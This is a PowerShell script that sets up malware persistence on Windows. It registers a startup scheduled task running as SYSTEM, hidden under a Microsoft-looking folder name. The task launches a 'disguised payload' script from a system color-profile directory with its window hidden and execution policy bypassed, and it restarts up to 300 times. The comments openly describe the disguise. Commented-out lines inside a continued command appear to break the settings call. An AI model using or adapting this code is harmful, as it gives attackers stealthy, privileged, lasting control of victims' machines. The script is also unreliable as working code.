try {
    # define what the task runs: powershells hidden and silent pointing to the disguised payload
    $action = New-ScheduledTaskAction `
        -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `"C:\Windows\System32\spool\drivers\color\ColorProfile_svc.ps1`""
    
    # trigger fires at system startup: no user login required
    $trigger = New-ScheduledTaskTrigger -AtStartup

    # task settings: high restart count so it keeps recovering, 1 min between retries
    $settings = New-ScheduledTaskSettingsSet `
        #-ExecutionTimeLimit (New-TimeSpan -Hours 0) `
        #-RestartCount 3 `
        -RestartCount 300 `
        -RestartInterval (New-TimeSpan -Minutes 1)

    # register the task buried under a legitimate looking microsoft folder path
    Register-ScheduledTask `
        -TaskName "ColorProfileUpdater" `
        -TaskPath "\Microsoft\Windows\WindowsColorSystem\" `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -RunLevel Highest `
        -User "SYSTEM" `
        -Force

    Write-Host "[+] Task registered successfully"
} catch {
    Write-Host "[-] Failed: $_"
}